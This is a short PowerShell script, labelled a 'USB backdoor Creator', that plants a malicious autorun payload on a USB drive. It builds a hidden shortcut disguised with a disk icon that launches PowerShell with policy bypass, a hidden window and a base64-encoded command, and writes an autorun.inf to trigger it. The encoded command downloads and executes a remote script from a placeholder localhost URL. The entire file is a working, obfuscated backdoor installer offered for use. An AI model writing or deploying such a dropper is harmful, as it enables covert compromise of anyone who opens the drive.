# USB backdoor Creator - USB WMI event is monitored and once USB is connected, this script is executed inside the USB and create backdoor. 
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("Disk.lnk")
$Shortcut.iconlocation = "%SystemRoot%\system32\SHELL32.dll,7"
$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.arguments = "-Exec Bypass -Nop -sta -W Hidden -Enc aQBlAHgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEALwB3AHcAdwAvAGwAaQBuAGsALwBwAG4AdAAuAHAAcwAxACcAKQApAA== "
$Shortcut.Save()
#move $USBDrive\* $USBDrive\container
# Hide folder
attrib +h Disk.lnk
$inf = @"
[AutoRun]
open=Disk.lnk
icon=%SystemRoot%\system32\SHELL32.dll,8
shellexecute=Disk.lnk
UseAutoPlay=1
"@
set-content .\autorun.inf -Value $inf
